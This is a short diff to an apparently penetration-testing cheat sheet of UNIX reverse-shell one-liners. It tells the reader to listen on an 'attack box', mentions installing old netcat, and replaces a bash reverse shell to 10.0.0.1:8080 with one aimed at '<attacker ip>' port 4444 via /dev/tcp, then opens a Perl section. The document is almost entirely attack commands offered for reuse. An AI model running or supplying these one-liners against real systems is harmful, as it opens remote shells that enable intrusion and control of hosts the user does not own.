@@ -1,6 +1,8 @@
 ## Reverse Shell One-liners
 These are a list of shell one liners which be invoked on most of UNIX systems
 
+For all these below mentioned you should be listening on your attack box 
+
 ### 1. Netcat
 
 For old versions of netcat -
@@ -13,9 +15,8 @@ This should work on most modern implementation of nc
 If you require to use old versions of netcat you can do so by 
 > sudo apt-get install netcat-traditional
 
-### 1. Bash
+### 2. Bash
 
+> bash -i >& /dev/tcp/<attacker ip>/4444 0>&1  
 
-
-
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+### 3. PERL
